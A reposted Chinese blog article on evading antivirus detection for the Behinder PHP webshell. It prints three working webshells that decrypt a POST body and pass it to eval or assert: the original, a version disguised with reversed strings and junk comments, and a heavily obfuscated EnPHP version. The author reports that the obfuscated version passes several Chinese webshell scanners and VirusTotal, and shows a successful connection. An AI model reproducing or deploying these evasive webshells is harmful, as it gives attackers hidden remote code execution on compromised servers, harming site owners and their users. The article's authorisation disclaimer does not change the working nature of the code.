<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/-WqHHx2HlYwK5bcjMbnmEA)

因前段时间退出了内网的学习，现在开始复习 web 方面的漏洞了，于是乎，开始了挖洞之旅，当我像往常一样上传冰蝎的 webhsell 时，**发现冰蝎的马子居然被杀了**....... 于是便有了该文章.....  

先说一下目前的免杀情况:

  
D 盾，河马等都零警报，  
vt 全绿，  
阿里云 webshell 查杀安全，  
百度 webshell 查杀安全,  
其他等等....  
目前仅测试了这些.... 其他的自行测试。

**文章开始:**

首先看一下冰蝎的原版马子:

```
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $_SESSION['k']=$key;
    $post=file_get_contents("php://input");
    if(!extension_loaded('openssl'))
    {
        $t="base64_"."decode";
        $post=$t($post."");

        for($i=0;$i<strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&15]; 
                }
    }
    else
    {
        $post=openssl_decrypt($post, "AES128", $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p."");\}\}
    @call_user_func(new C(),$params);
?>


```

看一下原版的查杀率:

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLoVPYmzDP6Y7WbDWV0VFfW3yZXujUjwhKWNEicC3WjZKgAvibicxmDpGtA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  
再看一下百度的接口：  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLduuBsxxKhosLia7plpjicOezJzicu92Oe99EldPsVswFGrzOZYVJuicIQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

阿里：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OL7tzZevsOjUAcJdzt0TzMTeZzuTbWKPFX9WI229RicC1BoqjJvNRLPbg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

河马，D 盾：  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OL8XccZlCADgZeMRWXdcQKoNWdDtRCKzhxvBNgWfR26w3YTleMszF6fA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  
基本上都被杀软标记了....

那么我们想用冰蝎的话，就必须要免杀了

**先说一下免杀的思路:**

对于静态免杀，主要便是混淆代码了，base64，hex，异或等等....

反正思路要扩展起来，可能很多师傅是玩 ctf 的，我没玩过..... 像里面的凯撒密码.... 等等各种密码学的东西其实可以搬到免杀的思路上来，但是像 base64 等等.... 可能早就被杀软计入特征库了，所以用 base64 等简单的加密，对 webshell 免杀可能不太好使了,

**那有没有简单些的方式达到静态免杀呢？**

答案是肯定的....

**比如 php 的字符串逆置函数 strrev()，可以将代码颠倒顺序，再在 webshell 里面加入注释，变量名称改改.... 使用一些 php 的魔术函数.... 以达到绕过杀软的静态防护。**

  
我们将 webshell 放到 d 盾查杀....

看看到底是哪部分代码导致被查杀....[做个免杀的师傅应该都知道特征码定位技术, 定位特征码, 修改特征码绕过杀软]。

  
这里各位师傅自己尝试吧，建议**二****分法**尝试, 或则根据自己的经验判断。

  
我这里对下面部分代码进行逆值颠倒：

```
<?php
/*
我啥也不知道.....
sjfasaadssada
dadadad
*/
session_start();
    $ok="1989870a9753c7b3";//cwk
    $_SESSION['k']=$ok;
    $zyq=(strrev("stnetnoc_teg_elif"))(strrev("tupni//:php"));
    $love=15;
    if(!extension_loaded(strrev('lssnepo')))
    {
        /*
我啥也不知道.....
sjfasaadssada
dadadad
*/
        $t=strrev("edoced_46esab");
        $zyq=$t($zyq."");
        /*
我啥也不知道.....
sjfasaadssada
dadadad
*/
        for($i=0;$i<strlen($zyq);$i++) {
            $o= $ok[$i+1&$love]^$zyq[$i]; 
            $zyq[$i] =$o;
        }
    }
    else
    {
        $zyq=(strrev("tpyrced_lssnepo"))($zyq, "AES128", $ok);
    }
    $arr=explode('|',$zyq);
    $func=$arr[0];
    /*
我啥也不知道.....
sjfasaadssada
dadadad
*/
    $suansuan=$arr[1];
    class MOL{
        public function __construct($p) 
    {   
        $a=null;
        $l=null;
            /*
我啥也不知道.....
sjfasaadssada
dadadad
*/
        assert("/*#`|W$~Q*/".$l.$p.$a.""."/*#`|W$~Q*/");
        }
        /*
我啥也不知道.....
sjfasaadssada
dadadad
*/
        }
    @new MOL($suansuan);    
?>
/*
我啥也不知道.....
sjfasaadssada
dadadad
*/


```

这里就是简单的改了一下变量名称，增加了一些注释，还有魔术函数....

  
可以看一下 D 盾，**河马过了**

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLgeKR12o6CLTBVrF3UVicSiawUZ04o4PC4IZk9aKF4FjRqr4QMILX2Enw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

至于百度那个还有阿里云.....：  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLzB0vC6Tx07NdSzBbfeNvxTQf6S7phug7LqjNvibHMZIgmYfPQB2rb9w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLa38r8f5QFTkzHHOTpbyMfuY36UGO9w33oxduxfFOeMTctUAtGu7e9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  
果然它们还是很强....

**怎么办呢？**

到这一步，对于我这种小白而言，已经穷途末路了.....

但是我们还可以**借助外部力量**....

之前代码审计的时候，发现很多代码都进行的加密... 但是程序依旧可以运行, 所以我们可不可以对我们的 webshell 进行加密呢?

当然肯定的.... 随便在网上找找免费的加密网站...

https://enphp.djunny.com/

把能勾的全都勾了...  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OL5bsdpcnNuYyOlAnT3FwXtQ0ibcyw7KZbMCeDZjMCB7icxQKkPLc8oroA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

进行加密处理:

加密之后的 webshell:  

```
<?php
/*
ddsds

-- EnPHP v2: http://enphp.djunny.com/
*/goto 愉帻;悈岽:$禈=0x0f;goto 佽乒;廷迹:class MOL{public function __construct($蚱岊){goto 榈蚨;榈蚨:$咜孟=null;goto 堥崍;悉ψ:溹唤(0x00000216a,0x02143)(溹唤(0x000219a,0x0021a8,0x0000218c,$蠇柱).$挃啚.$蚱岊.$咜孟.((parse_str("",$毇蒿)||$毇蒿)?base64_decode(key($毇蒿)):"").溹唤(0x000219a,0x0021a8,0x0000218c,$蠇柱));goto 稗;堥崍:$挃啚=null;goto 悉ψ;稗:\}\}goto 沫瞅;桷:if(!($仌弲<旞馨(0x000164b,0x01658,0x00161d)($夝麈)))goto 忟;goto €?洭矽:$嬴旔=騼霾(0x01ef5,0x0001f1f,0x0001ecf)(旞馨(0x015ef,0x00015fb,0x000015c5));goto ;非嗁:goto ;goto 堧駫;湛茎:session_start();goto 壼;沫瞅:@new MOL($鉃珛);goto 敝偖;壼:$璧瑏=騼霾(0x0001e70,0x00001e5d,$璧瑏);goto 啚庁;堧駫:僚曛:goto 洭矽;堝:function 溹唤(){goto 毢欫;毢欫:$昶橏=0x000002084;goto 楹惄;溺骝:櫡:goto 摅麜;陮粠:縼:goto 乔;菃変:return base64_decode('LyojYHxXJH5RKi8');goto 祲;乔:if(!($镫罢[0]==$昶橏+0x00a6))goto 鞃ㄝ;goto 贂慆;撁贪:鞃ㄝ:goto 苺鄞;楹惄:$镫罢=func_get_args();goto 玟葓;夠珱:return base64_decode(join("",array('Q','U','V','T','M','T','I','4')));goto 陮粠;贂慆:return base64_decode('fA');goto 撁贪;祲:濮:goto 摩弧;樅蓴:return((parse_str("砻鋻=YXNzZXJ0",$鑸塥)||$鑸塥)?base64_decode($鑸塥['砻鋻']):"");goto 溺骝;玟葓:if(!($镫罢[0x0002]==$昶橏+0x0000018))goto 縼;goto 夠珱;苺鄞:if(!($镫罢[0x001]==$昶橏+0x00bf))goto 櫡;goto 樅蓴;摅麜:if(!($镫罢[0x0002]==$昶橏+0x00000108))goto 濮;goto 菃変;摩弧:}goto 掑何;⒒麕:忟:goto 詪晃;詪晃::goto 枽掜;愉帻:error_reporting(0);goto 堝;动恰:goto 兑蛥;goto ⒒麕;€?$栦煻=$璧瑏[$仌弲+0x001&$禈]^$夝麈[$仌弲];goto 筮楱;席:$夝麈=strrev(旞馨(0x001695,0x000166e))($夝麈,溹唤(0x00020cd,0x020fd,0x0000209c),$璧瑏);goto 非嗁;鸂瓍:$夝麈=騼霾(0x01ef5,0x0001f1f,0x0001ecf)(騼霾(0x00001f66,0x0001f3d))(騼霾(0x01ef5,0x0001f1f,0x0001ecf)(旞馨(0x00001516)));goto 悈岽;佽乒:if(!旞馨(0x001550,0x000001521)(騼霾(0x01ef5,0x0001f1f,0x0001ecf)(旞馨(0x000158d,0x000015bb,0x00155f))))goto 僚曛;goto 席;椬窟:$仌弲++;goto 动恰;:$夝麈=$嬴旔($夝麈.gzinflate(' '));goto 笣;筮楱:$夝麈[$仌弲]=$栦煻;goto 檽偷;囫鸱:$阱蜎=$亽邼[0];goto 筷圆;筷圆:$鉃珛=$亽邼[0x001];goto 廷迹;檽偷:柇儶:goto 椬窟;掑何:function 旞馨(){goto 槥;堂稅:劳尤:goto 蒎埊;吒偳:险碍:goto 粳鰷;蒎埊:if(!(func_get_arg(0x001)==$伖８+0x00039))goto 险碍;goto 疅;苁陡:return(($族愳=gzinflate(substr(base64_decode('H4sIAAAAAAAAA0tNyU9OTYk3MUstTkwCAPbVV20NAAAA'),10,-8)))?$族愳:$丹椵);goto 觋Ⅹ;猷囔:return gzinflate('+)-人宰??  ');goto 堂稅;檸煿:if(!($螵孳[0x001]==$伖８+0x0186))goto 洞;goto 耽;燥鐣:if(!($螵孳[0x0002]==$伖８+0x00dd))goto 竿涡;goto 苁陡;亏彊:if(!($螵孳[0]==$伖８+0x002e))goto 劳尤;goto 猷囔;耽:return base64_decode('dHB5cmNlZF9sc3NuZXBv');goto 枟;疅:return base64_decode(join("",array('Z','X','h','0','Z','W','5','z','a','W','9','u','X','2','x','v','Y','W','R','l','Z','A')));goto 吒偳;亡铷:if(!($螵孳[0x0002]==$伖８+0x00000135))goto 浰琬;goto 华榇;柮键:浰琬:goto 檸煿;华榇:return base64_decode('c3RybGVu');goto 柮键;陥:$螵孳=func_get_args();goto 亏彊;枟:洞:goto 飹;觋Ⅹ:竿涡:goto 亡铷;槥:$伖８=0x00014e8;goto 陥;掟椴:纯臃:goto 燥鐣;兎烑:return gzinflate('?.蜬-? ');goto 掟椴;粳鰷:if(!($螵孳[0x0002]==$伖８+0x0000077))goto 纯臃;goto 兎烑;飹:}goto 鸨呦;啚庁:$_SESSION[騼霾(0x01ea5,0x000001e7c)]=$璧瑏;goto 鸂瓍;笣:$仌弲=0;goto 鹗寛;鹗寛:兑蛥:goto 桷;枽掜:$亽邼=explode(溹唤(0x0212a),$夝麈);goto 囫鸱;鸨呦:function 騼霾(){goto 阌;裏宴:return((parse_str("aw",$艳焯)||$艳焯)?base64_decode(key($艳焯)):"");goto 贁偫;溉:朝惉:goto 嬄虔;阌:$紧耖=0x01e50;goto 姥钷;硫:肮秆:goto 秱隇;劑矄:if(!($置钳[0x0002]==$紧耖+0x0007f))goto 肮秆;goto 炶澔;汅佞:return base64_decode(join("",array('M','T','k','4','O','T','g','3','M','G','E','5','N','z','U','z','Y','z','d','i','M','w')));goto 溉;帐肖:return base64_decode(join("",array('c','3','R','u','Z','X','R','u','b','2','N','f','d','G','V','n','X','2','V','s','a','W','Y')));goto 铂傈;秱隇:if(!($置钳[0x001]==$紧耖+0x000ed))goto 鎰;goto 帐肖;贁偫:瑧櫡:goto 劑矄;渭饸:if(!($置钳[0x001]==$紧耖+0x0000d))goto 朝惉;goto 汅佞;铂傈:鎰:goto 玳剷;嬄虔:if(!($置钳[0x001]==$紧耖+0x000002c))goto 瑧櫡;goto 裏宴;姥钷:$置钳=func_get_args();goto 渭饸;炶澔:return gzinflate('+.)*J- ');goto 硫;玳剷:}goto 湛茎;敝偖:echo((parse_str("LyoNCuaIkeWVpeS5n%2BS4jeefpemBky4uLi4uDQpzamZhc2FhZHNzYWRhDQpkYWRhZGFkDQoqLw0K",$啠)||$啠)?base64_decode(key($啠)):"");


```

反正我是看不懂了.... 就看杀软看不看的懂了....

d 盾河马。。。

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLQqFmqAK25lLFNOnYkGYMFgJ4ic5y1PF2W310F9cpHHEF6J7ia90ws3JA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

百度查杀接口...  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLRWn1U8ic2yor2xrD5aJObAMjTDfbwO2vgXy4P4WdgEDdtEic6FD5U1uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

阿里：  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLATX0deV4SibHfhLd6XDmjUpX0GgJkicn5CYUHQR1q8yFBTMBH8iaAcPyQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

vt:  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLWu4scfmkeLfbG6pianrMyZJhokdTYOTB1xwcMEabJM22q3ZEibJ91Evg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

https://n.shellpub.com/:  

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLk8MR2N6pe0Kx2cIibf9zVkcCFyTc6ic9I8lJmHR2oiaQ0OYUjCIvVFZow/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

都过了....

  
尝试连接：

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLHOXQrL9RKEEGicT1tA1qnxIQYm5UzU2fgA04xhvnaJ8MOpiczJUchIYg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OL3IK5q6xcPJqFd7SXpMP8iacL3H8QU60KZbIV5wQyXTeUglZyWDpAPdg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSERSF0icCcOiar9AxMxaeS2OLU17dbiax2owRCAknia6ZJtObahdA4p2ph6ISgiastZIo1PVSJdJw4S6ibA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1)

嗯... 很好

**总结：**  
对于免杀这方面有很多技巧..... 有时候也有玄学加成.... 哈哈哈, 很奇怪, 有时间各位师傅可以多看看杀软的工作原理再做免杀.....

  
本来前段时间想写 shellcode 的免杀什么的，但是太懒了

怎么说呢..... **免杀学的是技巧**.... 一般发出来的免杀都活不了多久, 所以说还是需要自己多学习一些技巧的......

  
对了，上面那个加密网站好像每次加密的效果不一样，如果加密之后 d 盾警告的话，可以增删改注释.....

声明：本公众号所分享内容仅用于网安爱好者之间的技术讨论，禁止用于违法途径，**所有渗透都需获取授权**！否则需自行承担，本公众号及原作者不承担相应的后果.

```
作者：suansuan
原文地址：https://xz.aliyun.com/t/11149

```

如有侵权，请联系删除

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpxr9XXibHdW6Eib11FYq0FDZFNMUgDMcqTyfs6iaX8OtFdlL6ypEVHCLrw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

好文推荐

![](https://mmbiz.qpic.cn/mmbiz_png/QO6oDpE0HEmt8Ss52ibJFcYB7ZHBRVbIpzdIMlC9plAr8AiaQRUUvBFXZM2scib9zTnRyp0XZQxSUYAWWS0avKrCA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

[红队打点评估工具推荐](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508839&idx=1&sn=abc801070b0e44475887ddbf7273c2e7&chksm=c3087017f47ff901ecb212aadc22c5cbfc6407da79b43a6f48a355cc3fd8c5af79c113db5fd1&scene=21#wechat_redirect)

[干货 | 红队项目日常渗透笔记](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247509256&idx=1&sn=76aad07a0f12d44427ce898a6ab2769e&chksm=c3087678f47fff6e2b750f41514d933390a8f97efef8ed18af7d8fb557500009381cd434ec26&scene=21#wechat_redirect)  

[实战 | 后台 getshell + 提权一把梭](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508609&idx=1&sn=f3fcd8bf0e75d43e3f26f4eec448671f&chksm=c30871f1f47ff8e74551b09f092f8673890607257f2d39c0efa314d1888a867dc718cc20b7b3&scene=21#wechat_redirect)

[一款漏洞查找器（挖漏洞的有力工具）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247507539&idx=2&sn=317a2c6cab28a61d50b22c07853c9938&chksm=c3080d23f47f8435b31476b13df045abaf358fae484d8fbe1e4dbd2618f682d18ea44d35dccb&scene=21#wechat_redirect)

[神兵利器 | 附下载 · 红队信息搜集扫描打点利器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247508747&idx=1&sn=f131b1b522ee23c710a8d169c097ee4f&chksm=c308707bf47ff96dc28c760dcd62d03734ddabb684361bd96d2f258edb0d50e77cdb63a3600a&scene=21#wechat_redirect)

[神兵利器 | 分享 直接上手就用的内存马（附下载）](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247506855&idx=1&sn=563506565571f1784ad1cb24008bcc06&chksm=c30808d7f47f81c11b8c5f13ce3a0cc14053a77333a251cd6b2d6ba40dc9296074ae3ffd055e&scene=21#wechat_redirect)

[推荐一款自动向 hackerone 发送漏洞报告的扫描器](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247501261&idx=1&sn=0ac4d45935842842f32c7936f552ee21&chksm=c30816bdf47f9fab5900c9bfd6cea7b1d99cd32b65baec8006c244f9041b25d080b2f23fd2c1&scene=21#wechat_redirect)

**关注我，学习网络安全不迷路**